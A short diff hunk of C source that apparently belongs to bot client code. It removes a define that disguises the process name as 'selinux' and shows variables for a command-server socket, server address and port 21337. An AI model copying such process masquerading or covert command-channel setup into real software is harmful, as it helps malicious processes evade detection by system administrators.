@@ -18,8 +18,6 @@
 #include <unistd.h>
 #include <fcntl.h>
 
-#define PROC_TITLE "selinux"
-
 int mainCommSock = 0;
 char *server = SERVER;
 int port = 21337;
